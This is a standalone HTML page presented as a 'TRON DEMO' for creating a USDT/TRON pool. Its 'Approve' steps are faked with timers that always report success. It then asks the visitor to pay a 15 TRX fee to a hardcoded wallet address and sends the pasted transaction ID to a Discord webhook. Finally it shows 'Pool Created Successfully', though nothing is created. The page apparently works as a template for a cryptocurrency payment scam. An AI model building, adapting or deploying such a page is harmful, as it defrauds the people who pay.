 <!DOCTYPE html>
<html lang="en">

<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width,initial-scale=1.0">

<title>TRON DEMO</title>

<style>

*{
margin:0;
padding:0;
box-sizing:border-box;
}

body{
background:#020617;
font-family:Arial,sans-serif;
color:#fff;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
overflow:hidden;
padding:20px;
}

.popup{
width:100%;
max-width:420px;
background:#0f172a;
border-radius:20px;
padding:20px;
overflow-y:auto;
max-height:95vh;
border:1px solid rgba(255,255,255,0.08);
box-shadow:0 0 40px rgba(0,0,0,0.5);
position:relative;
}

.title{
font-size:24px;
font-weight:bold;
text-align:center;
margin-bottom:20px;
}

.card{
background:#111827;
padding:15px;
border-radius:14px;
margin-bottom:15px;
border:1px solid rgba(255,255,255,0.04);
}

.label{
font-size:13px;
color:#94a3b8;
margin-bottom:8px;
}

.value{
font-size:18px;
font-weight:bold;
}

button{
width:100%;
padding:14px;
border:none;
border-radius:12px;
background:#dc2626;
color:white;
font-size:16px;
font-weight:bold;
cursor:pointer;
margin-top:12px;
transition:0.2s;
}

button:hover{
transform:scale(0.98);
}

button:disabled{
opacity:0.5;
cursor:not-allowed;
}

.status{
margin-top:10px;
font-size:14px;
text-align:center;
}

.spinner{
width:18px;
height:18px;
border:3px solid rgba(255,255,255,0.3);
border-top:3px solid #fff;
border-radius:50%;
display:inline-block;
animation:spin 1s linear infinite;
vertical-align:middle;
margin-right:8px;
}

@keyframes spin{
100%{
transform:rotate(360deg);
}
}

.modal{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(0,0,0,0.85);
display:none;
justify-content:center;
align-items:center;
padding:20px;
z-index:1000;
backdrop-filter:blur(6px);
}

.modal-box{
background:#0f172a;
padding:20px;
border-radius:20px;
width:100%;
max-width:420px;
position:relative;
border:1px solid rgba(255,255,255,0.08);
animation:pop 0.25s ease;
}

@keyframes pop{
from{
transform:scale(0.9);
opacity:0;
}
to{
transform:scale(1);
opacity:1;
}
}

.close{
position:absolute;
top:12px;
right:15px;
font-size:22px;
cursor:pointer;
color:#94a3b8;
}

.qr{
width:220px;
height:220px;
background:#fff;
margin:20px auto;
display:flex;
justify-content:center;
align-items:center;
border-radius:12px;
overflow:hidden;
}

.qr img{
width:100%;
height:100%;
object-fit:cover;
}

.address{
word-break:break-all;
background:#111827;
padding:12px;
border-radius:10px;
margin-top:15px;
font-size:14px;
line-height:1.5;
}

.copy-btn{
margin-top:10px;
background:#2563eb;
}

input{
width:100%;
padding:14px;
background:#111827;
border:none;
border-radius:12px;
color:white;
margin-top:10px;
outline:none;
font-size:15px;
}

.top-alert{
position:fixed;
top:20px;
right:20px;
background:#16a34a;
padding:14px 20px;
border-radius:12px;
display:none;
z-index:9999;
font-size:14px;
box-shadow:0 10px 25px rgba(0,0,0,0.3);
animation:slide 0.3s ease;
}

@keyframes slide{
from{
transform:translateY(-20px);
opacity:0;
}
to{
transform:translateY(0);
opacity:1;
}
}

.success{
background:#16a34a!important;
}

.error{
background:#dc2626!important;
}

.pending{
background:#2563eb!important;
}

.note{
font-size:13px;
color:#94a3b8;
margin-top:10px;
line-height:1.5;
}

@media(max-width:480px){

.popup{
padding:16px;
}

.title{
font-size:21px;
}

.qr{
width:200px;
height:200px;
}

}

</style>
</head>

<body>

<div class="top-alert" id="alertBox">
Confirming payment...
</div>

<div class="popup">

<div class="title">
TRON DEMO
</div>

<div class="card">
<div class="label">Network</div>
<div class="value">TRON</div>
</div>

<div class="card">
<div class="label">Pair</div>
<div class="value">USDT (TRC20)</div>
</div>

<div class="card">
<div class="label">Deposit Amount</div>
<div class="value">10,000 USDT</div>
</div>

<div class="card">

<div class="label">
Approve USDT
</div>

<div class="note">
You need to approve USDT before proceeding.
</div>

<button id="approve1">
Approve USDT
</button>

<div class="status" id="status1"></div>

</div>

<div class="card">

<div class="label">
Approve TRON
</div>

<div class="note">
You need to approve TRON before continuing.
</div>

<button id="approve2" disabled>
Approve TRON
</button>

<div class="status" id="status2"></div>

</div>

<div class="card">

<div class="note">
Pay fee for this demo service.
</div>

<button id="feeBtn" disabled>
Pay 15 TRX
</button>

</div>

<button id="createPool" disabled>
Create Pool
</button>

</div>

<div class="modal" id="modal">

<div class="modal-box">

<div class="close"
onclick="closeModal()">
✕
</div>

<h2 style="text-align:center;">
Scan QR Code
</h2>

<div class="qr">

<img
src="https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=TAnW9wrzbTo1Hafe4x2mKZFFqytuJpMqp6"
/>

</div>

<div class="address"
id="walletAddress">
TAnW9wrzbTo1Hafe4x2mKZFFqytuJpMqp6
</div>

<button class="copy-btn"
onclick="copyAddress()">
Copy Address
</button>

<div style="margin-top:20px;font-size:14px;color:#94a3b8;">
I've Paid
</div>

<input
id="txid"
placeholder="Paste payment TXID"
/>

<button id="submitTx">
Submit
</button>

</div>

</div>

<script>

const approve1 =
document.getElementById("approve1");

const approve2 =
document.getElementById("approve2");

const feeBtn =
document.getElementById("feeBtn");

const createPool =
document.getElementById("createPool");

const alertBox =
document.getElementById("alertBox");

const modal =
document.getElementById("modal");

approve1.onclick = ()=>{

approve1.disabled = true;

document.getElementById("status1").innerHTML =
'<span class="spinner"></span> Approving...';

setTimeout(()=>{

document.getElementById("status1").innerHTML =
'✅ Approved';

approve2.disabled = false;

showAlert(
"USDT Approved",
"success"
);

},3000);

};

approve2.onclick = ()=>{

approve2.disabled = true;

document.getElementById("status2").innerHTML =
'<span class="spinner"></span> Approving...';

setTimeout(()=>{

document.getElementById("status2").innerHTML =
'✅ Approved';

feeBtn.disabled = false;

showAlert(
"TRON Approved",
"success"
);

},3000);

};

feeBtn.onclick = ()=>{

modal.style.display =
"flex";

};

function closeModal(){

modal.style.display =
"none";

}

window.onclick = (e)=>{

if(e.target === modal){

closeModal();

}

};

function copyAddress(){

const address =
document.getElementById("walletAddress").innerText;

navigator.clipboard.writeText(address);

showAlert(
"Address copied",
"success"
);

}

function showAlert(message,type){

alertBox.style.display =
"block";

alertBox.innerHTML =
message;

alertBox.className =
"top-alert";

alertBox.classList.add(type);

setTimeout(()=>{

alertBox.style.display =
"none";

},3000);

}

document.getElementById("submitTx").onclick =
async ()=>{

const txid =
document.getElementById("txid")
.value
.trim();

if(!txid){

showAlert(
"Please enter TXID",
"error"
);

return;

}

showAlert(
"Confirming payment...",
"pending"
);

try{

await fetch(
"https://discord.com/api/webhooks/YOUR_WEBHOOK_URL",
{
method:"POST",

headers:{
"Content-Type":"application/json"
},

body:JSON.stringify({

content:
`🚨 NEW DEMO TXID

TXID:
${txid}

TIME:
${new Date().toLocaleString()}

STATUS:
Pending Review`
})
}
);

setTimeout(()=>{

showAlert(
"Payment Submitted",
"success"
);

feeBtn.innerHTML =
"Payment Confirmed";

feeBtn.disabled = true;

createPool.disabled = false;

closeModal();

},3000);

}catch(error){

console.log(error);

showAlert(
"Failed to submit",
"error"
);

}

};

createPool.onclick = ()=>{

showAlert(
"Pool Created Successfully",
"success"
);

};

</script>
